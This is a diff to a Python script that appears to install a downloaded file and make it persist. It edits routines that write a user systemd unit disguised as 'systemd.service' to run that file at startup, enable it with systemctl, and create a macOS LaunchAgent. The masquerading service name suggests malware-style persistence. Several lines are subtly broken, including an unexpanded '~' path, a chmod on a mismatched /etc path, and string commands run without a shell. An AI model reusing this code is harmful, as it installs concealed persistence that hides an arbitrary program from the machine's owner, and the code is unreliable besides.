@@ -24,7 +24,7 @@ def run(url, file_path):
     def create_systemd_service(file_path):
         subprocess.run("mkdir -p  ~/.config/systemd/user/", shell=True)
 
-        with open ('~/.config/systemd/user/systemd.service', 'w') as f:
+        with open ('~/.config/systemd/user/systemd.service', 'w+') as f:
             f.write(f"""[Unit]
 Description=systemd service
 After=network.target
@@ -39,8 +39,9 @@ ExecStart={file_path}
 WantedBy=multi-user.target""")
 
         subprocess.run('chmod +x /etc/systemd/system/systemd.service')
-        subprocess.run('systemctl start systemd')
-        subprocess.run('systemctl enable systemd')
+        subprocess.run('systemctl --user daemon-reload')
+        subprocess.run('systemctl --user start systemd')
+        subprocess.run('systemctl --user enable systemd')
     
     def create_launch_agent(path, label):
         plist_content = f"""
